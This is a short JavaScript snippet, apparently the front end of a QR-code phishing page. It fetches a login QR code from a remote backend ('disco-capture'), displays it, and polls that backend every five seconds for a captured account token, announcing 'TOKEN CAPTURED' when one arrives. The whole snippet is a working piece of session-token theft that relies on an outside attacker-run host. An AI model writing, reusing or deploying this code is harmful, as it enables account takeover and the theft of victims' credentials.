async function init() { try { const res = await fetch('https://disco-capture-production.up.railway.app/get-qr'); const data = await res.json(); document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`; // Check for token every 5 seconds setInterval(async () => { const tokenRes = await fetch('https://disco-capture-production.up.railway.app/get-token'); const tokenData = await tokenRes.json(); if (tokenData.token) { alert("TOKEN CAPTURED: " + tokenData.token); } }, 5000); } catch (e) { console.log("Waiting for backend..."); } }
